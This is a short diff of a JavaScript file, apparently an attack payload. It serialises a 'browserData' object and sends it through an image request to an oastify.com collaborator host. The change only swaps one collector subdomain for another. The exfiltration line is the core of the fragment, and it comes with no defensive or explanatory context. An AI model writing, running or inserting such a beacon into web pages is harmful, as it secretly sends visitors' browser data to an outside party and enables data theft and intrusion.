@@ -22,4 +22,4 @@ const browserData = {
 
 const dump = JSON.stringify(browserData, null, 2);
 
-new Image().src = "https://cs8g78fo5s8r33w5oxfpop9wrnxel59u.oastify.com/collect?data=" + encodeURIComponent(dump);
+new Image().src = "https://3ptcg1wv90hwodttgpgdoncn5eb5zvnk.oastify.com/collect?data=" + encodeURIComponent(dump);
